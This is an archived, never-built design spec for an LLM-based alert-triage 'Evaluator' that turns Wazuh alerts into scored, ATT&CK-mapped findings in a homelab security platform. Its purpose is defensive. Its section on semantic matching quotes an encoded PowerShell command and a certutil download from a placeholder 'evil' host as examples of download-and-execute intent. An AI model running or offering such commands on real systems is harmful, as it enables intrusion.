> # ⚠️ ARCHIVED — never implemented
>
> Written 2026-06-19 while designing the platform, before the scope was frozen
> at the ingestion layer (see [`../DECISIONS.md`](../DECISIONS.md)). Recovered
> on 2026-09-21 from a working copy where it had never been committed, and
> published unchanged apart from removing identifiers of the author's homelab.
>
> It references components that were never built (`lab/scope.yaml`,
> `attacker/`, `defender/`, the benchmark) and two private lab notes that are
> not part of this repository (`DEVLOG-infra.md`, `lab-setup.md`). For what
> the repository actually contains, see the root `README.md`.

---

# ShadowTwin — Evaluator AI: Architecture & Build Spec

**Audience:** the engineer building the Evaluator (the AI/ML lead).
**Status:** design spec, ready to build against. Companion to
`docs/architecture-v2.md` (whole platform) and `docs/DEVLOG-infra.md` (the lab).

The Evaluator is **Phase 1** of the ShadowTwin pipeline. Its job, in one line:

> Take Wazuh's structured alerts and reduce many noisy events into a few
> high-confidence, MITRE-mapped, scored **Findings** — with reasoning — so the
> Attacker only spends effort on what's worth proving.

It acts like a **Senior SOC Analyst**: parse → reduce noise → understand intent →
correlate context → map to ATT&CK → score. Only high-confidence Findings proceed.

---

## 0. The decision that settles the "local LLM vs PyTorch/Colab" debate

This was an open question between the two of us. It is now **decided**, and the
reasoning matters, so it's written out here.

**We do NOT train or fine-tune a model. We USE a pre-trained open LLM, guided by
prompting + Retrieval-Augmented Generation (RAG) + tool-calling, running locally
via Ollama.**

Three separate questions were getting conflated. Separating them:

| Question | Answer | Why |
|---|---|---|
| **Train/fine-tune, or use pre-trained?** | **Use pre-trained.** | Training needs large labeled datasets, GPUs, weeks of ML iteration — it eats projects. A good general model + our data fed as *context* gets us there faster and is the mainstream way LLM security triage is done. |
| **Where does it run?** | **Local (Ollama).** | The whole project is on-prem / sandboxed / private. Sensitive security telemetry must not leave the lab. Local is free, reproducible (critical for the benchmark), and matches the thesis identity. Cloud/Colab breaks all of that. |
| **What framework?** | **Ollama + an orchestration layer** (e.g. Python). **Not PyTorch.** | PyTorch is for *training/building* models. We're *using* a model, so we talk to it through Ollama's API. PyTorch only appears if we later build a tiny ML pre-filter classifier (optional, see §4). |

**Why not Colab/cloud, explicitly:** Colab is a notebook for *experiments and
training runs* — it times out, loses state, isn't always-on, and is in the cloud.
The Evaluator is a *continuously-running service* sitting next to Wazuh inside an
isolated lab, reading sensitive telemetry. It cannot run on Colab. (Colab is fine
for the partner to *prototype/experiment* in early on; it is not where the
Evaluator *runs*.)

**What "use our data" means without training:** we don't bake our data into model
weights (training). We **retrieve relevant facts at query time** and put them in
the prompt — the alert itself, the matching MITRE technique description, our
known-bad/known-good examples, asset context. That's RAG/in-context. Benefits:
instantly updatable (change the data, no retraining), cheaper, faster, and the
model's reasoning stays inspectable.

**The mental model:** the LLM is a smart, general analyst. We don't send it to
school (training); we hand it a well-organized case file (RAG) and the right tools,
and ask it to reason.

---

## 1. Inputs (scope locked: Wazuh structured alerts only)

The Evaluator consumes **Wazuh's already-decoded alerts**, not raw logs.

**Why:** Wazuh's decoders + rule engine already turn raw logs into structured
alerts, and its **Vulnerability Detection** and **SCA (CIS)** modules emit
structured findings too. Starting here means **no log-parser to build for v1**
(Drain3 etc. deferred — see §6). It also matches the actual lab: a Linux Juice
Shop target monitored by Wazuh. No Windows/Sysmon/network-log intake in v1 (that's
telemetry we don't generate — see §6 rejected list).

**Concrete input sources (all from Wazuh):**
- Wazuh **alerts** (the decoded, rule-matched events) via the Wazuh API / alerts
  JSON / indexer.
- Wazuh **Vulnerability Detection** results (CVE candidates).
- Wazuh **SCA** results (CIS misconfig findings) — these also feed the Defender.

> Probe the real shape first: before coding the parser, pull a handful of real
> alerts from the running Wazuh (4.14.5) and build against the
> actual JSON, not assumptions.

---

## 2. Outputs (the scored Finding)

The Evaluator writes/updates the shared **Finding** object (defined in
`architecture-v2.md` §1.1). Its slice:

```
finding.evaluator = {
  severity,                 # low | medium | high | critical
  confidence,               # 0.0–1.0  (and a label: see confidence ladder)
  suspicious: bool,
  business_context,         # from asset info / graph if present
  attck: { tactics[], techniques[] },   # ATT&CK IDs, grounded (not hallucinated)
  evidence_ref,             # pointer to the raw alert(s) this came from
  rationale,                # short human-readable reasoning
  investigation_recommendation,
  model, prompt_hash, reasoning_trace   # for the benchmark + audit
}
finding.status = "triaged"   # only high-confidence ones proceed to the Attacker
```

**Confidence ladder (human-readable, from the reference spec — adopt it):**
`Informational → Suspicious → Likely → High-Confidence`. Only `Likely`+ proceed.

**Reduction target (the Evaluator's reason to exist):** many alerts in → few
Findings out. The reference framing "100,000 logs → 500 findings" is the right
mental model; the pre-filter (§3 stage B) is what achieves it.

---

## 3. The Evaluator pipeline (component by component)

Six internal stages. Stages A–E are v1; the vector layer is a deferred hook (§5).

```
Wazuh alerts
   │
   ▼
[A] Intake adapter         WE BUILD  — alert → candidate Finding (status=new)
   │
   ▼
[B] Deterministic pre-filter  WE BUILD — dedup, known-good, thresholds  (100k→500)
   │
   ▼
[C] Context assembly (RAG)  WE BUILD — gather the "case file" for the LLM
   │   (asset info · MITRE technique text · known-bad/good examples · history)
   ▼
[D] LLM triage (Ollama)     WE BUILD glue / REUSE model — suspicion+confidence+reasoning
   │
   ▼
[E] MITRE ATT&CK mapping    WE BUILD — grounded technique IDs (not free-text)
   │
   ▼
[F] Scored Finding → Store  status=triaged ; high-confidence → Attacker
```

### [A] Intake adapter *(WE BUILD)*
Reads Wazuh alerts (API/indexer), normalizes each into a candidate Finding,
writes via the `Store` interface. The only genuinely new glue. Keep it thin — map
Wazuh fields → Finding fields; don't reinterpret here.

### [B] Deterministic pre-filter *(WE BUILD)* — the noise-reduction step
Cheap, rule-based, **before any LLM**. Drops/merges:
- exact + near-duplicate alerts,
- known-good / expected admin activity (allowlist),
- below-threshold severities,
- collapses bursts (e.g. a brute-force flood → one Finding).
**Why this is the highest-leverage component:** running every alert through an LLM
is slow and expensive; filtering first is what makes the system usable and cheap.
This is where **LogAI** (clustering/anomaly) can slot in later if volume grows; v1
can be simple rules + thresholds.

### [C] Context assembly / RAG *(WE BUILD)* — "build the case file"
For each surviving candidate, gather the facts the LLM needs and put them in the
prompt:
- the alert(s) themselves,
- **MITRE technique descriptions** retrieved for any technique the alert hints at,
- **known-bad / known-good reference snippets** (curated; small to start),
- **asset context** (host role, criticality) from the Store/graph if present,
- recent related events (simple history lookup).
This is the "uses our data" mechanism — retrieval, not training. Start simple
(keyword/field lookups); upgrade to embedding-similarity retrieval later (§5).

### [D] LLM triage *(WE BUILD glue; REUSE the model)* — the reasoning core
A local LLM (Ollama) receives the assembled context and returns a **structured**
verdict (enforce JSON schema): suspicious?, confidence, severity, rationale,
investigation recommendation. Capture `model`, `prompt_hash`, `reasoning_trace`
for the benchmark and audit.
- **Behind a provider interface** so the model is swappable (per
  `architecture-v2.md` §5) — this is also what lets the benchmark compare models.
- Handles **novel/obfuscated intent** without a reference library (why it can
  carry v1 even before the vector layer exists).

### [E] MITRE ATT&CK mapping *(WE BUILD)*
Map each Finding to ATT&CK tactic + technique IDs, **grounded** in the ATT&CK
knowledge base (look up real technique IDs; don't let the LLM invent them). Feeds
the Defender's mitigation mapping and is a benchmark-scored field.

### [F] Scored Finding output
Write the completed `finding.evaluator`, set `status=triaged`. Only
`Likely`/`High-Confidence` proceed to the Attacker. Everything is a render of the
one Finding object.

---

## 4. Tools the LLM can call (agent behavior = prompting, not training)

The Evaluator LLM is given **tools** (functions it can call). This is orchestration
+ prompting, not training. Candidate tools for v1:
- `lookup_mitre(technique_or_keyword)` → returns ATT&CK technique details.
- `lookup_cve(id)` → CVE/KEV/EPSS details (from threat-intel feeds).
- `get_asset(host)` → asset role/criticality from the Store/graph.
- `search_similar(event)` → (later) embedding similarity over known-bad/good.

**Optional tiny ML pre-filter (the ONE place PyTorch/Colab is legitimate):** if the
partner wants a lightweight classifier to pre-score events before the LLM, that's a
small model he *could* train, and Colab is fine for *that experiment* — but it then
runs **locally**, and it's **optional** (rules + LLM cover v1). Do not let this
become "train the main model."

---

## 5. The vector / semantic layer — DEFERRED, but seam kept

**What it would do:** embed events into vectors that capture *meaning*, so
`powershell -enc <b64>` and `certutil -urlcache -f http://evil` register as the
**same intent** (download+execute) despite sharing no keywords. Three jobs:
intent-dedup, match-vs-known-bad (raise score), match-vs-known-good (suppress).

**Why deferred for v1:** embeddings only help if there's a **library of reference
examples** to compare against. With one Juice Shop scenario and low volume, that
library is nearly empty → near-zero day-one value. Meanwhile the LLM (stage D)
already handles novel intent. So it adds infra + complexity for little early gain.

**When to add:** volume grows, a curated known-bad/known-good set exists, or
LLM-cost/dedup starts to hurt.

**How we keep it a switch-on, not a rewrite:** use **pgvector inside the same
Postgres** that backs the Store — embeddings live next to Findings, no separate
service. (NOT Qdrant — see §6. Qdrant is a second service built for billion-vector
scale we won't reach; pgvector is right-sized and co-located.) Stage C's retrieval
is written so it can switch from keyword lookup to embedding similarity without
touching D/E/F.

---

## 6. Explicitly deferred / rejected (with reasons)

**Deferred (build later, seam kept):**
- **Vector layer (embeddings + pgvector)** — §5. Low day-one value; add with volume.
- **Dedicated log parser (Drain3 / hybrid LLM parsers)** — Wazuh already decodes
  logs, so redundant for v1. If raw-log ingestion is ever needed, 2026 research
  favors hybrid LLM parsers (DeepParse, LILAC) over plain Drain3 — reassess then.

**Rejected for this project:**
- **Qdrant as a separate vector service** — over-provisioned (billion-vector scale)
  and a second service on a RAM-tight box. Use pgvector if/when we do vectors.
- **Full enterprise telemetry** (Sysmon, Windows Event Logs, network logs,
  multi-scanner asset discovery) — the cage is a Linux target on Wazuh; we don't
  generate that telemetry. Building intake for it is the "platform fantasy" scope
  trap. (Extensible later if a Windows target is added — Wazuh supports it.)
- **Training/fine-tuning the main LLM** — §0. Unnecessary, slow, risky.
- **Cloud/Colab as the runtime** — breaks the on-prem/private model and isn't a
  service host. §0.
- **"Fully autonomous" framing** — the platform is human-in-the-loop and advisory;
  the Evaluator *recommends investigation*, it doesn't act autonomously.

---

## 7. Recommended stack (for the partner)

| Concern | Choice | Note |
|---|---|---|
| LLM runtime | **Ollama**, local | matches on-prem/private; free; reproducible |
| LLM model | pre-trained open model behind a **provider interface** | Qwen3-8B / DeepSeek-R1 (general); evaluate DeepHat, xOffense (security-tuned). Per-stage model choice; enables benchmark model-comparison |
| Orchestration | Python (LLM calls, tools, pipeline) | not PyTorch |
| Structured output | enforce **JSON schema** on LLM output (e.g. Pydantic) | matches the Finding object |
| Pre-filter | rules/thresholds now; **LogAI** later | the 100k→500 step |
| RAG retrieval | keyword/field lookup now; **pgvector** later | §5 |
| MITRE | ATT&CK knowledge base (STIX/JSON) | grounding, not hallucination |
| Store | the shared `Store` interface (SQLite now, Postgres/pgvector later) | one source of truth |

---

## 8. Build order (for the Evaluator specifically)

1. **Probe Wazuh's real alert JSON** — pull samples from the live manager; build
   the Finding mapping against reality.
2. **Intake adapter [A]** — Wazuh alert → candidate Finding in the Store.
3. **Deterministic pre-filter [B]** — dedup/known-good/thresholds. Prove the
   reduction on real alert volume.
4. **LLM triage [D] via Ollama** behind the provider interface — structured JSON
   verdict on one alert type, end to end.
5. **Context assembly [C]** — start with simple lookups (MITRE text, asset info).
6. **MITRE mapping [E]** — grounded technique IDs.
7. **Scored Finding [F]** — high-confidence → Attacker hand-off.
8. *Then, when justified:* vector layer (pgvector) in C/D; optional ML pre-filter;
   more input types.

Get one alert type → high-confidence Finding end-to-end before breadth. That single
path is already demoable and benchmarkable.

---

## 8.5 LLM hosting & the three-agent reality (DECIDED)

The Evaluator, Attacker, and Defender are three **roles**, not three running
models. Decisions, with reasoning:

**One shared model, three roles via prompts + tools.**
- The three agents run **sequentially** (a finding goes Evaluator → Attacker →
  Defender), so only **one** model is ever loaded/active at a time.
- They use the **same model**, differentiated by **system prompt + toolset** —
  the model is the engine, the prompt is the role. You get different *behavior*
  from prompts, not from different weights.
- **Why not different models per agent (on this hardware):** on a CPU-only,
  shared box, switching models means Ollama **unloads + reloads** weights every
  swap — tens of seconds per finding, twice per finding (E→A→D). Keeping three
  7–8B models resident would blow the RAM budget (≈24GB+ for models, on top of
  Wazuh's 8GB and other VMs). Model-swap thrashing is the #1 CPU performance
  killer. Per-agent models become reasonable only with a GPU (models stay hot) or
  a proven need (e.g. a security-tuned model for the Attacker). Deferred.

**Runs on the Proxmox box, CPU-only (for now).**
- Always-on, self-contained, no GPU/IPEX setup. The Proxmox box has no usable GPU
  (Ryzen 5 3400G iGPU isn't useful for LLMs).
- Speed reality: a 7–8B model on CPU ≈ **2–5 tok/s** (a verdict in ~1–3 min);
  a ~4B model ≈ 2–3× faster. Memory is NOT the constraint (32GB holds any of
  these); **patience** is. Fine for a **background triage pipeline** (not
  interactive). The pre-filter (§3 B) keeps volume low, so slowness is tolerable.
- The OmniBook (Arc 140T, ~15–17 tok/s for 8B with IPEX-LLM) is **intentionally
  NOT wired in yet** — it's a laptop (not always-on). Add it later as an optional
  faster endpoint via the provider interface if CPU speed hurts.

**Model choice: start small, swap up.**
- Start with a **~4B-class model** (e.g. Qwen3-4B / Llama-3.2-3B) to get the full
  three-agent pipeline working with fast iteration on CPU.
- Swap up to **Qwen3-8B / DeepSeek-R1-8B** for quality once it works — a config
  change via the **provider interface**, not a rewrite.
- On a shared box, the lighter model is the better neighbor (competes less with
  Wazuh + the other VMs for RAM/CPU).

**The provider interface keeps all of this swappable.** Endpoint (CPU box vs
OmniBook GPU), model (4B vs 8B vs security-tuned), and per-stage choice are all
config — so none of today's decisions are one-way doors. This is also what lets
the benchmark compare models later.

---

## 9. One-paragraph summary to align both of us

The Evaluator uses a **pre-trained local LLM (Ollama)**, guided by **prompting +
RAG (our data fed as context) + tools** — **no training, no PyTorch, no cloud**. It
ingests **Wazuh's structured alerts**, **cheaply filters noise first**, **assembles
a context "case file"**, has the **LLM reason** to a structured verdict, **grounds
MITRE mapping**, and emits a **scored Finding** where only high-confidence ones
proceed. The semantic/vector layer (pgvector) and a log parser are **deferred
behind clean seams**, not built in v1. This is lean, private, reproducible, and
matches the lab we actually have.
